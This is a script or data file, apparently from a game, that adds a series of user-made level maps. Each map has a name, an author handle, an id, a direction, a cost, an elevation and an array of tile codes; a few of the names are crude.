maps.push({name="DickJump",author="MoistNoodlez",id="#1658531070",direction="forward",cost=446,elevation=0,map=[1,5,5,5,5,5,5,5,5,2,2,5,5,5,5,5,5,5,5,1,1,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,1,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,1,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,1,5,125,5,125,5,125,5,5,5,5,5,5,125,5,125,5,125,5,1,1,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,1,5,10,10,10,10,10,5,5,5,5,5,5,10,10,10,10,10,5,1,1,10,10,10,10,10,10,10,61,62,62,61,10,10,10,10,10,10,10,1,1,10,10,12,12,12,10,10,62,63,63,62,10,10,12,12,12,10,10,1,1,10,12,14,14,125,12,10,62,64,64,62,10,12,125,14,14,12,10,1,1,10,12,100,125,14,12,10,62,94,93,62,10,12,14,125,100,12,10,1,1,10,12,14,14,125,12,10,62,64,64,62,10,12,125,14,14,12,10,1,1,10,10,12,12,12,10,10,62,63,63,62,10,10,12,12,12,10,10,1,1,10,10,10,10,10,10,10,61,62,62,61,10,10,10,10,10,10,10,1,1,5,10,10,10,10,10,67,66,66,66,66,67,10,10,10,10,10,5,1,1,5,5,5,5,5,5,5,67,67,67,67,5,5,5,5,5,5,5,1,1,5,5,5,5,5,5,5,66,66,66,66,5,5,5,5,5,5,5,1,1,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,1,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,1,5,5,5,5,5,5,5,5,2,2,5,5,5,5,5,5,5,5,1]});
maps.push({name="MouseEscape",author="MoistNoodlez",id="#1658531368",direction="forward",cost=209,elevation=0,map=[0,0,0,0,0,0,1,1,2,2,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,9,9,9,9,9,1,1,0,0,0,0,0,0,0,0,0,0,1,9,9,9,125,9,9,9,9,1,0,0,0,0,0,0,0,0,0,0,1,9,9,19,19,9,9,9,9,1,0,0,0,0,0,0,0,0,0,1,1,9,9,19,19,9,9,9,9,1,0,0,0,0,0,0,0,0,0,1,9,9,9,19,100,9,9,9,9,1,0,0,0,0,0,0,0,0,0,1,9,9,9,19,127,9,9,9,9,1,0,0,0,0,0,0,0,0,0,1,9,9,9,19,19,9,9,9,9,1,0,0,0,0,0,0,0,0,0,1,9,9,9,9,9,9,9,9,9,1,0,0,0,0,0,0,0,0,0,1,9,9,9,9,9,9,9,9,9,1,0,0,0,0,0,0,0,0,0,1,9,9,9,9,9,9,9,9,9,1,0,0,0,0,0,0,0,0,0,1,9,9,9,9,9,9,9,9,9,1,0,0,0,0,0,0,0,0,0,1,9,9,9,9,9,9,9,9,9,1,0,0,0,0,0,0,0,0,0,1,9,9,9,9,9,9,9,9,9,1,0,0,0,0,0,0,0,0,0,1,9,9,9,9,9,9,9,9,9,1,0,0,0,0,0,0,0,0,0,0,1,9,9,135,135,9,9,9,9,1,0,0,0,0,0,0,0,0,0,0,1,9,9,9,9,9,9,9,9,1,0,0,0,0,0,0,0,0,0,0,1,9,9,9,9,9,9,9,1,1,0,0,0,0,0,0,0,0,0,0,0,1,9,9,9,9,9,9,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,2,2,1,1,1,0,0,0,0,0,0,0,0]});
maps.push({name="TripleJumps",author="MoistNoodlez",id="#1658532203",direction="forward",cost=308,elevation=-15,map=[0,0,0,0,1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,1,24,24,24,24,24,24,24,24,24,24,24,24,24,24,1,0,0,0,0,1,0,0,0,0,0,0,1,24,24,24,24,24,24,24,1,0,0,0,0,1,0,0,0,0,0,0,1,24,24,24,24,24,24,24,1,0,0,0,0,1,0,0,0,0,0,0,1,24,24,24,24,24,24,24,1,0,0,0,0,1,18,18,18,18,18,18,1,18,18,18,18,18,18,18,1,0,0,0,0,1,18,18,18,18,18,18,1,95,95,95,95,95,95,95,1,0,0,0,0,1,18,18,18,18,18,18,1,18,18,18,18,18,18,18,1,0,0,0,0,1,0,0,0,0,0,0,1,13,13,13,13,13,13,13,1,0,0,0,0,1,0,0,0,0,0,0,1,13,13,13,13,13,13,13,1,0,0,0,0,1,0,0,0,0,0,0,1,95,95,95,95,95,95,95,1,0,0,0,0,1,13,13,13,13,13,13,1,13,13,13,13,13,13,13,1,0,0,0,0,1,13,13,13,13,13,13,1,13,13,13,13,13,13,13,1,0,0,0,0,1,13,13,13,13,13,13,1,13,13,13,13,13,13,13,1,0,0,0,0,1,0,0,0,0,0,0,1,9,9,9,9,9,9,9,1,0,0,0,0,1,0,0,0,0,0,0,1,9,9,9,9,9,9,9,1,0,0,0,0,1,0,0,0,0,0,0,1,9,9,9,9,9,9,9,1,0,0,0,0,1,9,9,9,9,9,9,1,95,95,95,95,95,95,95,1,0,0,0,0,1,9,9,9,9,9,9,9,9,9,9,9,9,9,9,1,0,0,0,0,1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="DeathValley",author="MoistNoodlez",id="#1658532604",direction="forward",cost=215,elevation=0,map=[0,0,0,0,1,1,1,1,2,2,1,1,1,1,0,0,0,0,0,0,0,0,0,0,1,24,92,5,5,5,5,92,24,1,0,0,0,0,0,0,0,0,0,0,1,24,5,5,5,5,5,5,24,1,0,0,0,0,0,0,0,0,0,0,1,24,5,5,5,88,5,5,86,1,0,0,0,0,0,0,0,0,0,0,1,24,5,88,5,5,88,5,24,1,0,0,0,0,0,0,0,0,0,0,1,24,5,5,5,5,5,5,24,1,0,0,0,0,0,0,0,0,0,0,1,24,5,5,88,5,88,5,24,1,0,0,0,0,0,0,0,0,0,0,1,86,5,5,5,5,5,5,86,1,0,0,0,0,0,0,0,0,0,0,1,24,5,5,5,5,5,5,24,1,0,0,0,0,0,0,0,0,0,0,1,24,88,5,5,100,5,88,24,1,0,0,0,0,0,0,0,0,0,0,1,24,5,88,5,5,5,5,24,1,0,0,0,0,0,0,0,0,0,0,1,86,5,5,5,88,5,5,24,1,0,0,0,0,0,0,0,0,0,0,1,24,5,5,5,5,88,5,24,1,0,0,0,0,0,0,0,0,0,0,1,24,5,5,88,5,5,5,86,1,0,0,0,0,0,0,0,0,0,0,1,86,5,5,5,5,5,5,24,1,0,0,0,0,0,0,0,0,0,0,1,24,5,5,5,5,5,5,24,1,0,0,0,0,0,0,0,0,0,0,1,24,5,5,88,88,5,5,24,1,0,0,0,0,0,0,0,0,0,0,1,100,5,5,5,5,5,5,100,1,0,0,0,0,0,0,0,0,0,0,1,24,92,5,5,5,5,92,24,1,0,0,0,0,0,0,0,0,0,0,1,1,1,1,2,2,1,1,1,1,0,0,0,0,0,0]});
maps.push({name="RagingEye",author="MoistNoodlez",id="#1658534227",direction="forward",cost=433,elevation=0,map=[0,0,0,0,0,0,1,2,2,1,1,1,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,24,24,24,24,1,1,1,0,0,0,0,0,0,0,0,1,1,1,24,24,24,24,24,24,76,76,24,1,1,0,0,0,0,0,0,1,24,76,24,24,24,24,24,76,76,24,24,24,1,1,0,0,0,0,1,1,24,24,76,24,24,24,76,76,24,24,24,24,24,1,1,0,0,0,1,24,24,24,76,24,24,24,24,24,24,24,24,24,24,24,1,0,0,1,1,76,24,24,24,5,5,5,5,5,24,24,76,24,24,24,1,1,0,1,24,76,76,24,5,66,66,66,66,66,5,24,24,76,76,24,24,1,0,1,24,24,76,76,5,66,66,5,66,66,5,24,24,24,76,76,76,1,0,1,24,24,24,24,5,66,5,131,5,66,5,24,24,76,24,24,24,1,0,1,24,24,24,24,5,66,66,5,66,66,5,24,24,76,24,24,24,1,0,1,24,76,24,24,5,66,66,66,66,66,5,24,24,24,24,24,24,1,0,1,24,24,76,76,24,5,5,5,5,5,24,24,24,24,24,24,24,1,0,1,1,76,24,24,24,24,24,24,24,24,24,24,76,24,24,24,1,1,0,0,1,24,24,24,24,24,24,76,24,24,76,76,24,24,24,24,1,0,0,0,1,1,24,24,24,24,24,76,76,24,24,76,76,76,76,1,1,0,0,0,0,1,24,24,24,24,24,24,76,76,24,24,24,24,1,1,0,0,0,0,0,1,1,1,24,24,24,24,24,76,76,24,24,1,1,0,0,0,0,0,0,1,1,1,1,95,95,95,95,95,1,1,1,0,0,0,0,0,0,0,0,1,132,24,24,95,2,2,1,1,1,1,0,0,0,0,0,0,0]});
maps.push({name="ZmPlzTrigger",author="MoistNoodlez",id="#1658536086",direction="right",cost=254,elevation=0,map=[1,2,2,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,14,96,14,99,1,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,14,96,14,14,1,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,14,14,96,96,1,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,14,14,14,14,1,1,1,1,1,1,1,1,1,1,1,1,14,14,14,14,14,14,14,14,14,14,14,98,14,14,14,14,14,14,2,1,97,14,14,14,14,14,14,14,14,14,14,98,14,14,14,14,14,14,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="Death Verified",author="Mr Robot",id="#1658835714",direction="forward",cost=352,elevation=-19,map=[24,24,24,24,24,24,1,1,1,1,1,1,1,1,43,44,24,24,2,2,24,69,69,69,69,69,66,66,42,42,0,42,85,90,43,44,24,24,24,24,24,69,69,69,69,69,66,66,42,42,0,42,42,86,43,67,67,67,67,67,24,66,66,24,24,24,1,1,1,1,1,1,1,1,1,67,67,67,67,67,76,20,20,76,76,76,1,0,0,0,0,0,0,0,0,0,0,0,0,0,76,20,20,76,76,76,1,0,0,0,0,0,0,0,0,0,0,0,0,0,76,20,20,1,1,1,1,0,0,0,0,0,0,0,0,96,0,0,0,0,76,20,20,95,19,19,19,18,18,17,17,16,16,15,15,96,14,13,13,12,76,20,20,1,19,19,19,18,18,17,17,132,16,15,15,96,14,13,13,12,1,1,1,1,19,19,19,0,0,0,0,0,0,0,0,96,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,19,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,0,0,0,0,135,0,0,0,102,10,0,0,0,0,92,10,10,10,10,0,0,0,0,0,135,0,0,0,0,92,24,24,77,24,24,101,101,101,101,0,0,0,0,0,135,0,0,0,0,0,77,83,83,83,77,0,0,8,8,0,0,0,0,0,135,0,0,0,0,0,77,131,97,83,77,0,0,7,7,0,0,0,0,0,19,0,0,0,0,0,24,19,19,83,77,0,0,6,6,0,0,0,0,0,0,0,19,0,0,19,77,24,19,24,24,0,5,5,5,0,0,0,0,0,19,0,0,19,19,0,0,19,83,83,77,0,5,2,2]});
maps.push({name="Open Trigger",author="Mr Robot",id="#1659125664",direction="forward",cost=808,elevation=0,map=[102,14,76,76,135,135,135,135,14,2,2,14,135,135,135,135,76,76,14,102,14,14,76,76,135,135,135,135,14,14,14,14,135,135,135,135,76,76,14,14,135,76,76,76,135,135,135,135,135,135,135,135,135,135,135,135,76,76,76,135,135,76,76,76,135,135,135,135,135,135,135,135,135,135,135,135,76,76,76,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,14,135,135,135,135,135,135,135,135,14,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,14,14,135,135,135,14,14,135,135,135,14,14,135,135,135,135,135,135,135,135,14,14,135,135,135,14,14,135,135,135,14,14,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,76,76,76,135,135,135,135,135,135,135,135,135,135,135,135,76,76,76,135,135,76,76,76,135,135,135,101,101,101,101,101,101,135,135,135,76,76,76,135,14,14,76,76,135,135,135,101,14,14,14,14,101,135,135,135,76,76,14,14,102,14,76,76,135,135,135,101,14,2,2,14,101,135,135,135,76,76,14,102]});
maps.push({name="Vaufferino",author="cmodii",id="#1659131947",direction="forward",cost=134,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,17,6,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,21,0,0,0,0,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,0,0,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,11,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,12,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,12,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,22,5,5,5,5,5,5,5,5,5,0,0,0,0,23,0,0,0,0,0,5,5,5,5,5,5,5,5,10,0,0,0,0,0,0,5,5,5,0,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,0,0,0,0,5,0,0,0,0,0,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Big Dick Defense",author="Polynation",id="#1659314409",direction="forward",cost=273,elevation=-3,map=[0,0,0,0,24,24,132,2,2,132,24,24,24,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,24,24,24,24,24,24,0,0,0,0,0,0,0,0,0,24,24,24,24,132,24,24,24,24,24,24,0,0,0,0,0,0,0,0,0,24,24,24,24,21,24,132,24,24,24,24,0,0,0,0,0,0,0,0,0,24,132,24,21,21,21,24,24,132,24,24,0,0,0,0,0,0,0,0,0,24,24,21,21,21,21,21,24,24,24,24,0,0,0,0,0,0,0,0,24,24,21,21,21,21,21,21,21,24,132,24,0,0,0,0,0,0,0,0,24,132,24,21,21,21,21,21,24,24,24,24,0,0,0,0,0,0,0,0,24,24,24,21,21,21,21,21,24,132,24,24,0,0,0,0,0,0,0,0,24,132,24,21,21,21,21,21,24,24,24,24,24,0,0,0,0,0,0,0,24,24,24,21,21,21,21,21,24,132,24,24,24,0,0,0,0,0,0,0,24,132,24,21,21,21,21,21,24,24,24,24,24,0,0,0,0,0,0,0,24,24,24,21,21,21,21,21,24,132,24,24,24,24,0,0,0,0,0,0,24,132,24,21,21,21,21,21,24,24,24,132,24,24,0,0,0,0,0,0,24,24,24,21,21,21,21,21,21,21,24,24,24,24,24,24,0,0,0,0,24,24,24,21,21,21,21,21,21,21,21,24,24,132,24,24,24,0,0,24,24,24,24,21,21,21,21,21,21,21,21,21,24,24,24,24,24,0,0,24,132,24,24,21,21,21,2,2,21,21,21,21,24,24,132,24,0]});
maps.push({name="Lips",author="MoistNoodlez",id="#1659480489",direction="forward",cost=516,elevation=0,map=[0,0,0,0,0,1,5,2,2,5,5,1,1,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,5,5,5,5,1,1,0,0,0,0,0,0,0,0,0,0,0,1,5,5,5,82,82,5,5,1,1,1,0,0,0,0,0,0,0,0,0,1,5,82,5,82,82,82,82,5,5,1,1,0,0,0,0,0,0,0,1,1,5,82,5,5,82,82,82,82,5,5,1,0,0,0,0,0,0,0,1,5,5,82,82,5,82,82,82,82,5,5,1,1,0,0,0,0,0,1,1,5,82,82,82,5,5,82,82,82,82,5,5,1,1,0,0,0,0,1,5,5,82,82,82,82,5,82,82,82,82,82,96,1,1,0,0,0,1,1,5,82,82,82,82,82,5,5,82,82,82,82,96,1,1,0,0,0,1,97,5,5,82,82,82,82,82,5,82,82,82,82,96,99,1,0,0,0,1,1,1,5,5,82,82,82,82,5,82,82,82,82,96,96,1,0,0,0,0,1,1,1,5,82,82,82,82,5,82,82,82,82,5,5,1,0,0,0,0,1,5,98,5,82,82,82,82,5,5,82,82,82,5,5,1,0,0,0,1,1,5,98,82,82,82,82,82,82,5,82,82,82,5,5,1,0,0,0,1,100,5,98,82,82,82,82,82,82,5,82,82,82,5,5,1,0,0,0,1,1,1,5,5,5,82,82,82,82,5,82,82,82,5,5,1,0,0,0,0,0,1,1,1,5,5,5,82,82,5,82,82,5,5,1,1,0,0,0,0,0,0,1,1,1,1,5,82,82,5,82,5,5,5,1,1,0,0,0,0,0,0,0,0,1,1,5,5,5,5,5,5,5,1,1,0,0,0,0,0,0,0,0,0,0,1,1,5,2,2,5,5,1,1,1,0,0]});
maps.push({name="Eye",author="MoistNoodlez",id="#1659480976",direction="forward",cost=188,elevation=0,map=[0,0,0,0,0,0,9,2,2,9,9,9,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,9,9,9,9,9,9,9,9,0,0,0,0,0,0,0,9,9,9,9,0,0,0,0,0,9,9,9,9,9,0,0,0,0,0,0,9,0,0,0,0,0,0,0,0,0,0,0,9,9,9,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,0,0,0,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,9,9,0,0,0,5,5,5,5,5,5,5,0,0,0,0,0,9,9,0,9,0,0,0,0,5,66,66,66,66,66,5,0,0,0,0,0,9,9,0,9,0,0,0,0,5,66,66,5,66,66,5,0,0,0,0,0,9,9,0,9,0,0,0,0,5,66,5,131,5,66,5,0,0,0,0,0,9,9,0,9,0,0,0,0,5,66,5,100,5,66,5,0,0,0,0,0,9,9,0,9,0,0,0,0,5,66,5,131,5,66,5,0,0,0,0,0,9,9,0,9,0,0,0,0,5,66,66,5,66,66,5,0,0,0,0,0,9,9,0,9,9,0,0,0,5,66,66,66,66,66,5,0,0,0,0,0,9,9,0,0,9,0,0,0,5,5,5,5,5,5,5,0,0,0,0,0,9,0,0,0,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,9,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,9,9,9,9,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,9,132,9,9,9,2,2,9,9,9,9,9,0,0,0,0,0,0]});
maps.push({name="Hot",author="MoistNoodlez",id="#1659494546",direction="right",cost=564,elevation=0,map=[0,0,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,0,0,0,0,0,1,114,114,114,114,114,114,114,114,114,114,114,114,114,1,0,0,0,0,0,1,114,75,75,75,75,75,75,75,75,75,75,75,114,1,0,0,0,0,0,1,114,75,75,75,75,75,75,75,75,75,75,75,114,1,0,0,0,0,0,1,114,114,114,114,114,75,75,114,114,114,114,114,114,1,0,0,0,0,0,1,1,1,1,1,114,75,75,114,1,1,1,1,1,1,0,0,0,0,0,1,114,114,114,114,114,75,75,114,114,114,114,114,114,1,0,0,0,0,0,1,114,75,75,75,75,75,75,75,75,75,75,75,114,1,0,0,0,0,0,1,114,75,75,75,75,75,75,75,75,75,75,75,114,1,1,1,1,0,0,1,114,114,114,114,114,114,114,114,114,114,114,114,114,1,1,114,114,1,1,1,1,77,77,77,77,1,1,1,1,1,1,96,1,1,1,114,2,1,114,114,114,114,114,114,114,114,114,1,114,114,114,114,1,0,1,114,2,1,114,76,76,76,76,76,76,76,114,77,114,80,80,114,1,1,1,96,114,1,114,76,76,76,76,76,76,76,114,77,114,80,80,114,114,114,114,114,1,1,114,76,76,94,14,93,76,76,114,77,114,80,80,80,80,80,80,114,1,1,114,76,76,76,76,76,76,76,114,77,114,80,80,80,80,80,80,114,1,1,114,76,76,76,76,76,76,76,114,77,114,80,80,114,114,114,114,114,1,1,97,114,114,114,114,114,114,114,114,1,114,80,80,114,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,114,114,114,114,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,0,0,0,0]});
maps.push({name="Cold",author="MoistNoodlez",id="#1659495387",direction="forward",cost=358,elevation=0,map=[0,0,1,14,14,14,14,2,2,14,14,14,14,14,1,0,0,0,0,0,0,0,1,14,72,72,72,72,72,72,72,72,72,14,1,0,0,0,0,0,0,0,1,14,72,72,72,72,72,72,72,72,72,14,1,0,0,0,0,0,0,0,1,14,72,72,14,14,14,14,14,72,72,14,1,0,0,0,0,0,0,0,1,14,72,72,14,1,1,1,14,72,72,14,1,0,0,0,0,0,0,0,1,14,72,72,14,1,97,1,14,72,72,14,1,0,0,0,0,0,0,0,1,14,72,72,14,1,14,1,14,72,72,14,1,0,0,0,0,0,0,0,1,14,14,14,14,14,14,14,14,14,14,14,1,0,0,0,0,0,0,0,1,1,1,14,67,67,67,67,67,14,1,1,1,0,0,0,0,0,0,0,0,0,1,14,67,94,94,94,67,14,1,0,0,0,0,0,0,0,0,0,0,0,1,14,67,67,67,67,67,14,1,1,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,1,1,1,1,65,65,65,65,65,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,65,65,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,100,1,96,96,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,1,14,74,72,71,71,74,72,14,1,0,0,0,0,0,0,0,0,0,0,1,14,71,73,66,66,71,73,14,1,0,0,0,0,0,0,0,0,0,0,1,14,14,71,71,71,71,14,14,1,0,0,0,0,0,0,0,0,0,0,1,1,14,14,2,2,14,14,1,1,0,0]});
maps.push({name="PropHouse",author="MoistNoodlez",id="#1659569960",direction="forward",cost=292,elevation=0,map=[0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,1,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,91,91,1,1,1,1,1,1,0,0,0,0,0,0,1,54,54,54,54,54,54,54,54,90,54,54,54,1,0,0,0,0,0,0,1,90,54,90,54,54,54,54,54,54,54,90,54,1,0,0,0,0,0,0,1,54,54,54,90,54,90,54,54,90,54,54,54,1,0,0,0,0,0,0,1,54,54,90,54,54,54,54,90,54,90,54,90,1,0,0,0,0,0,0,1,54,54,54,54,90,54,90,54,54,54,54,54,1,0,0,0,0,0,0,1,54,54,90,54,90,54,54,54,90,54,90,54,1,0,0,0,0,0,0,1,90,54,54,54,54,54,90,54,90,54,54,90,1,0,0,0,0,0,0,1,54,54,90,90,54,54,90,54,54,54,54,54,1,0,0,0,0,0,0,1,54,54,54,54,90,54,54,90,90,54,90,54,1,0,0,0,0,0,0,1,54,54,90,54,54,90,54,54,90,54,54,90,1,0,0,0,0,0,0,1,90,90,54,90,54,54,54,90,54,90,54,54,1,0,0,0,0,0,0,1,54,54,90,54,54,90,54,54,54,54,90,54,1,0,0,0,0,0,0,1,90,54,54,90,54,54,90,54,90,90,54,54,1,0,0,0,0,0,0,1,54,90,54,54,54,54,54,54,90,54,90,54,1,0,0,0,0,0,0,1,1,1,1,1,1,91,91,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,1,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0]});
maps.push({name="CTCheckpoint",author="MoistNoodlez",id="#1659570824",direction="forward",cost=224,elevation=0,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,20,20,20,20,20,20,91,91,20,20,20,20,20,20,0,0,0,0,0,0,20,54,54,54,54,54,54,54,54,54,54,54,54,20,0,0,0,0,0,0,20,54,93,54,54,54,54,54,54,54,54,93,54,20,0,0,0,0,0,0,20,54,54,93,54,54,54,54,54,54,93,54,54,20,0,0,0,0,0,0,20,54,93,54,54,54,54,54,54,54,54,93,54,20,0,0,0,0,0,0,20,54,54,93,54,54,54,54,54,54,93,54,54,20,0,0,0,0,0,0,20,54,93,54,54,54,54,54,54,54,54,93,54,20,0,0,0,0,0,0,20,54,54,93,54,54,54,54,54,54,93,54,54,20,0,0,0,0,0,0,20,54,93,54,54,54,54,54,54,54,54,93,54,20,0,0,0,0,0,0,20,54,54,93,54,54,54,54,54,54,93,54,54,20,0,0,0,0,0,0,20,54,93,54,54,54,54,54,54,54,54,93,54,20,0,0,0,0,0,0,20,54,54,93,54,54,54,54,54,54,93,54,54,20,0,0,0,0,0,0,20,54,93,54,54,54,54,54,54,54,54,93,54,20,0,0,0,0,0,0,20,54,54,54,54,54,54,54,54,54,54,54,54,20,0,0,0,0,0,0,20,20,20,20,20,20,91,91,20,20,20,20,20,20,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="ZMCheckpoint",author="MoistNoodlez",id="#1659570976",direction="forward",cost=320,elevation=0,map=[0,1,14,14,14,14,14,14,2,2,14,14,14,14,14,14,1,0,0,0,0,1,14,14,14,14,14,14,14,14,14,14,14,14,14,14,1,0,0,0,0,1,14,94,14,94,14,14,14,14,14,14,94,14,94,14,1,0,0,0,0,1,14,14,94,14,14,14,14,14,14,14,14,94,14,14,1,0,0,0,0,1,14,94,14,94,14,14,14,14,14,14,94,14,94,14,1,0,0,0,0,1,14,14,94,14,14,14,14,14,14,14,14,94,14,14,1,0,0,0,0,1,14,94,14,94,14,14,14,14,14,14,94,14,94,14,1,0,0,0,0,1,14,14,94,14,14,14,14,14,14,14,14,94,14,14,1,0,0,0,0,1,14,94,14,94,14,14,14,14,14,14,94,14,94,14,1,0,0,0,0,1,14,14,94,14,14,14,14,14,14,14,14,94,14,14,1,0,0,0,0,1,14,94,14,94,14,14,14,14,14,14,94,14,94,14,1,0,0,0,0,1,14,14,94,14,14,14,14,14,14,14,14,94,14,14,1,0,0,0,0,1,14,94,14,94,14,14,14,14,14,14,94,14,94,14,1,0,0,0,0,1,14,14,94,14,14,14,14,14,14,14,14,94,14,14,1,0,0,0,0,1,14,94,14,94,14,14,14,14,14,14,94,14,94,14,1,0,0,0,0,1,14,14,94,14,14,14,14,14,14,14,14,94,14,14,1,0,0,0,0,1,14,94,14,94,14,14,14,14,14,14,94,14,94,14,1,0,0,0,0,1,14,14,94,14,14,14,14,14,14,14,14,94,14,14,1,0,0,0,0,1,14,94,14,94,14,14,14,14,14,14,94,14,94,14,1,0,0,0,0,1,14,14,14,14,14,14,2,2,14,14,14,14,14,14,1,0,0,0]});
